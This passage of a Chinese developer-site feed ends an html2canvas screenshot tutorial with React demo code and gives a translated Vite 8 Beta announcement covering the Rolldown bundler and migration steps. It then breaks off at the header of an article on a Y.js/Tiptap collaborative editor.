      <span class="hljs-keyword">let</span> fileName = <span class="hljs-string">"img"</span> + <span class="hljs-string">"."</span> + type;
      <span class="hljs-comment">// 保存为文件</span>
      <span class="hljs-keyword">let</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-property">href</span> = imgDt;
      a.<span class="hljs-property">download</span> = fileName;
      a.<span class="hljs-title function_">click</span>();
    });
  };
</code></pre>
<p>图片的默认背景色是<code>#ffffff</code>，如果想要透明色可设置为<code>null</code>，比如设置为红色。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1c4b6bdfc054d8c8a800aa6a1030d70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=W3M6s470YEpjxNOJOSM3Z7HDX20%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span> };
</code></pre>
<p>正常情况下网络图片是无法渲染的，可以使用<code>useCORS</code>属性，设置为<code>true</code>即可。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec958d764f54d9995584d094f67ffe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=%2FjVHD84CpZTrf7Y689JHuLKYaFo%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span> };
</code></pre>
<p>保存某块元素的截图</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a80dadfbdb4f4c5d9f61cd5fb538143e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=GWOn%2Bc8dIJ2ikH4Av9OzV64rkUU%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"swiper"</span>);
</code></pre>
<p>如果希望将某些元素排除，可以将<code>data-html2canvas-ignore</code>属性添加到这些元素中，<code>html2canvas</code>将从渲染中排除这些元素。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fcc603cf51e467b9dd3fecc7766833a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=mGLMC3Ubuynj3KpwUd10a5XjygE%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
  <span class="hljs-attr">data-html2canvas-ignore</span>
  <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
  <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>
  <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveCanvas}</span>
&gt;</span>
  download
<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
</code></pre>
<p>完整代码</p>
<pre><code class="hljs language-js" lang="js">npm install html2canvas
</code></pre>
<pre><code class="hljs language-css" lang="css">// demo<span class="hljs-selector-class">.less</span>
<span class="hljs-selector-class">.contentSwiper</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">710px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">375px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">48px</span>;
  user-select: none;
}
<span class="hljs-selector-class">.swiper</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Space</span>, <span class="hljs-title class_">Swiper</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd-mobile"</span>;
<span class="hljs-keyword">import</span> html2canvas <span class="hljs-keyword">from</span> <span class="hljs-string">"html2canvas"</span>;
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">"./demo.less"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">saveCanvas</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 画布基础元素，要绘制的元素</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"root"</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span>
  };
    <span class="hljs-title function_">html2canvas</span>(canvas, options).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">canvas</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> type = <span class="hljs-string">"png"</span>;
      <span class="hljs-comment">// 返回值是一个数据url，是base64组成的图片的源数据</span>
      <span class="hljs-keyword">let</span> imgDt = canvas.<span class="hljs-title function_">toDataURL</span>(type);
      <span class="hljs-keyword">let</span> fileName = <span class="hljs-string">"img"</span> + <span class="hljs-string">"."</span> + type;
      <span class="hljs-comment">// 保存为文件</span>
      <span class="hljs-keyword">let</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-property">href</span> = imgDt;
      a.<span class="hljs-property">download</span> = fileName;
      a.<span class="hljs-title function_">click</span>();
    });
  };
  <span class="hljs-keyword">const</span> <span class="hljs-attr">colors</span>: string[] = [<span class="hljs-string">"#ace0ff"</span>, <span class="hljs-string">"#bcffbd"</span>, <span class="hljs-string">"#e4fabd"</span>, <span class="hljs-string">"#ffcfac"</span>];
  <span class="hljs-keyword">const</span> items = colors.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">color, index</span>) =&gt;</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Swiper.Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.contentSwiper}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">background:</span> <span class="hljs-attr">color</span> }}&gt;</span>
        {index + 1}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Swiper.Item</span>&gt;</span></span>
  ));
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"swiper"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.swiper}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Swiper</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
            "<span class="hljs-attr">--track-padding</span>"<span class="hljs-attr">:</span> " <span class="hljs-attr">0</span> <span class="hljs-attr">0</span> <span class="hljs-attr">16px</span>",
          }}
          <span class="hljs-attr">defaultIndex</span>=<span class="hljs-string">{1}</span>
        &gt;</span>
          {items}
        <span class="hljs-tag">&lt;/<span class="hljs-name">Swiper</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">width</span>=<span class="hljs-string">{200}</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">"https://t7.baidu.com/it/u=2621658848,3952322712&amp;fm=193&amp;f=GIF"</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Space</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
          <span class="hljs-attr">data-html2canvas-ignore</span>
          <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
          <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveCanvas}</span>
        &gt;</span>
          download
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>&gt;</span>
          Solid
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"outline"</span>&gt;</span>
          Outline
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>&gt;</span>
          None
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Space</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite 8 Beta：由 Rolldown 驱动的 Vite]]></title>    <link>https://juejin.cn/post/7581693431741202495</link>    <guid>https://juejin.cn/post/7581693431741202495</guid>    <pubDate>2025-12-10T02:53:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431741202495" data-draft-id="7581693431741169727" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite 8 Beta：由 Rolldown 驱动的 Vite"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T02:53:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金安东尼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite 8 Beta：由 Rolldown 驱动的 Vite
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金安东尼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:53:55.000Z" title="Wed Dec 10 2025 02:53:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2Fblog%2Fannouncing-vite8-beta" target="_blank" title="https://vite.dev/blog/announcing-vite8-beta" ref="nofollow noopener noreferrer">Vite 8 Beta: The Rolldown-powered Vite</a></p>
<p>作者：Vite Team</p>
<p>翻译：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN" target="_blank" title="https://github.com/TUARAN" ref="nofollow noopener noreferrer">TUARAN</a></p>
<p>欢迎关注 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">前端周刊</a>，每周更新国外论坛的前端热门文章，紧跟时事，掌握前端技术动态。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4b2b91d91f24c3a9536c752035078e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940035&amp;x-signature=6xaVRnAeFsFPuJ0NpSnr5k8DcIs%3D" alt="Vite 8 Beta Announcement Cover Image" loading="lazy"/></p>
<p><strong>简述</strong>：由 Rolldown 驱动的 Vite 8 首个 Beta 版本现已发布。Vite 8 带来了显著更快的生产构建速度，并开启了未来改进的可能性。你可以通过将 <code>vite</code> 升级到 <code>8.0.0-beta.0</code> 版本并阅读迁移指南来尝试新版本。</p>
<p>我们很高兴发布 Vite 8 的首个 Beta 版本。此版本统一了底层工具链，带来了更好的一致性行为，以及显著的构建性能提升。Vite 现在使用 Rolldown 作为其打包器，取代了之前 esbuild 和 Rollup 的组合。</p>
<h2 data-id="heading-0">面向 Web 的新打包器</h2>
<p>Vite 之前依赖两个打包器来满足开发和生产构建的不同需求：</p>
<ul>
<li><strong>esbuild</strong> 用于开发期间的快速编译</li>
<li><strong>Rollup</strong> 用于生产构建的打包、分块和优化</li>
</ul>
<p>这种方法让 Vite 专注于开发者体验和编排，而不是重新发明解析和打包。然而，维护两个独立的打包管道引入了不一致性：独立的转换管道、不同的插件系统，以及为了保持开发和生产之间打包行为一致而不断增加的胶水代码。</p>
<p>为了解决这个问题，VoidZero 团队构建了 <strong>Rolldown</strong>，这是下一代打包器，目标是在 Vite 中使用。它的设计宗旨是：</p>
<ul>
<li><strong>性能</strong>：Rolldown 用 Rust 编写，以原生速度运行。它达到了 esbuild 的性能水平，比 Rollup 快 10–30 倍。</li>
<li><strong>兼容性</strong>：Rolldown 支持与 Rollup 和 Vite 相同的插件 API。大多数 Vite 插件在 Vite 8 中开箱即用。</li>
<li><strong>更多功能</strong>：Rolldown 为 Vite 解锁了更多高级功能，包括全打包模式（full bundle mode）、更灵活的分块控制、模块级持久缓存、模块联邦（Module Federation）等。</li>
</ul>
<h2 data-id="heading-1">统一工具链</h2>
<p>Vite 更换打包器的影响不仅仅在于性能。打包器利用了解析器、解析器、转换器和压缩器。Rolldown 使用 <strong>Oxc</strong>（另一个由 VoidZero 领导的项目）来实现这些目的。</p>
<p>这使得 Vite 成为由同一团队维护的端到端工具链的入口点：构建工具 (Vite)、打包器 (Rolldown) 和编译器 (Oxc)。</p>
<p>这种对齐确保了整个技术栈的行为一致性，并允许我们在 JavaScript 继续演进时快速采用并与新语言规范保持一致。它还解锁了以前仅靠 Vite 无法实现的广泛改进。例如，我们可以利用 Oxc 的语义分析在 Rolldown 中执行更好的 Tree-shaking。</p>
<h2 data-id="heading-2">Vite 如何迁移到 Rolldown</h2>
<p>迁移到由 Rolldown 驱动的 Vite 是一个根本性的变化。因此，我们的团队采取了审慎的步骤来实施它，而不牺牲稳定性或生态系统兼容性。</p>
<p>首先，发布了一个独立的 <code>rolldown-vite</code> 包作为技术预览。这使我们能够在不影响 Vite 稳定版本的情况下与早期采用者合作。早期采用者受益于 Rolldown 的性能提升，同时提供了宝贵的反馈。亮点包括：</p>
<ul>
<li>Linear 的生产构建时间从 46 秒减少到 6 秒</li>
<li>Ramp 的构建时间减少了 57%</li>
<li>Mercedes-Benz.io 的构建时间减少了高达 38%</li>
<li>Beehiiv 的构建时间减少了 64%</li>
</ul>
<p>接下来，我们建立了一个测试套件，用于针对 <code>rolldown-vite</code> 验证关键的 Vite 插件。这个 CI 任务帮助我们尽早发现回归和兼容性问题，特别是对于 SvelteKit、react-router 和 Storybook 等框架和元框架。</p>
<p>最后，我们构建了一个兼容层，以帮助开发者从 Rollup 和 esbuild 选项迁移到相应的 Rolldown 选项。</p>
<p>结果是，每个人都有了一条通往 Vite 8 的平滑迁移路径。</p>
<h2 data-id="heading-3">迁移到 Vite 8 Beta</h2>
<p>由于 Vite 8 触及核心构建行为，我们专注于保持配置 API 和插件钩子不变。我们创建了一个迁移指南来帮助你升级。</p>
<p>有两种可用的升级路径：</p>
<ol>
<li><strong>直接升级</strong>：在 <code>package.json</code> 中更新 <code>vite</code> 并运行通常的开发和构建命令。</li>
<li><strong>逐步迁移</strong>：从 Vite 7 迁移到 <code>rolldown-vite</code> 包，然后再迁移到 Vite 8。这允许你在不更改 Vite 其他部分的情况下，识别仅与 Rolldown 相关的兼容性问题或故障。（推荐用于大型或复杂项目）</li>
</ol>
<p><strong>重要提示</strong></p>
<p>如果你依赖特定的 Rollup 或 esbuild 选项，你可能需要对 Vite 配置进行一些调整。请参阅迁移指南以获取详细说明和示例。与所有非稳定主要版本一样，建议在升级后进行彻底测试，以确保一切按预期工作。请务必报告任何问题。</p>
<p>如果你使用的框架或工具将 Vite 作为依赖项（例如 Astro、Nuxt 或 Vitest），你必须在 <code>package.json</code> 中覆盖 <code>vite</code> 依赖项，根据你的包管理器，操作略有不同：</p>
<p><strong>npm / Yarn / pnpm / Bun</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"overrides"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8.0.0-beta.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>添加这些覆盖后，重新安装依赖项并像往常一样启动开发服务器或构建项目。</p>
<h2 data-id="heading-4">Vite 8 的其他功能</h2>
<p>除了搭载 Rolldown 之外，Vite 8 还带来了：</p>
<ul>
<li><strong>内置 tsconfig paths 支持</strong>：开发者可以通过将 <code>resolve.tsconfigPaths</code> 设置为 <code>true</code> 来启用它。此功能有较小的性能开销，默认不启用。</li>
<li><strong>emitDecoratorMetadata 支持</strong>：Vite 8 现在内置了对 TypeScript <code>emitDecoratorMetadata</code> 选项的自动支持。有关更多详细信息，请参阅功能页面。</li>
</ul>
<h2 data-id="heading-5">展望未来</h2>
<p>速度一直是 Vite 的标志性特征。与 Rolldown 以及 Oxc 的集成意味着 JavaScript 开发者将受益于 Rust 的速度。升级到 Vite 8 应该仅仅因为使用 Rust 就能带来性能提升。</p>
<p>我们也为即将发布 Vite 的**全打包模式（Full Bundle Mode）**感到兴奋，这将极大地提高大型项目的 Vite 开发服务器速度。初步结果显示，开发服务器启动速度提高了 3 倍，完整重新加载速度提高了 40%，网络请求减少了 10 倍。</p>
<p>Vite 的另一个标志性特征是插件生态系统。我们希望 JavaScript 开发者继续使用他们熟悉的 JavaScript 语言扩展和定制 Vite，同时受益于 Rust 的性能提升。我们的团队正在与 VoidZero 团队合作，加速这些基于 Rust 的系统中的 JavaScript 插件使用。</p>
<p>目前处于实验阶段的即将到来的优化：</p>
<ul>
<li><strong>原始 AST 传输</strong>：允许 JavaScript 插件以最小的开销访问 Rust 生成的 AST。</li>
<li><strong>原生 MagicString 转换</strong>：简单的自定义转换，逻辑在 JavaScript 中，但计算在 Rust 中。</li>
</ul>
<h2 data-id="heading-6">联系我们</h2>
<p>如果你尝试了 Vite 8 beta，我们很乐意听到你的反馈！请报告任何问题或分享你的经验：</p>
<ul>
<li><strong>Discord</strong>：加入我们的社区服务器进行实时讨论</li>
<li><strong>GitHub</strong>：在 GitHub discussions 上分享反馈</li>
<li><strong>Issues</strong>：在 <code>rolldown-vite</code> 仓库报告错误和回归问题</li>
<li><strong>Wins</strong>：在 <code>rolldown-vite-perf-wins</code> 仓库分享你改进的构建时间</li>
</ul>
<p>我们感谢所有的报告和复现案例。它们有助于指导我们发布稳定的 8.0.0 版本。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从原理到实现：基于 Y.js 和 Tiptap 的实时在线协同编辑器全解析]]></title>    <link>https://juejin.cn/post/7581702285564543026</link>    <guid>https://juejin.cn/post/7581702285564543026</guid>    <pubDate>2025-12-10T02:35:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285564543026" data-draft-id="7581888578507931675" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从原理到实现：基于 Y.js 和 Tiptap 的实时在线协同编辑器全解析"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-12-10T02:35:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码农突围NO1"/> <meta itemprop="url" content="https://juejin.cn/user/1843250655412046"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从原理到实现：基于 Y.js 和 Tiptap 的实时在线协同编辑器全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1843250655412046/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码农突围NO1
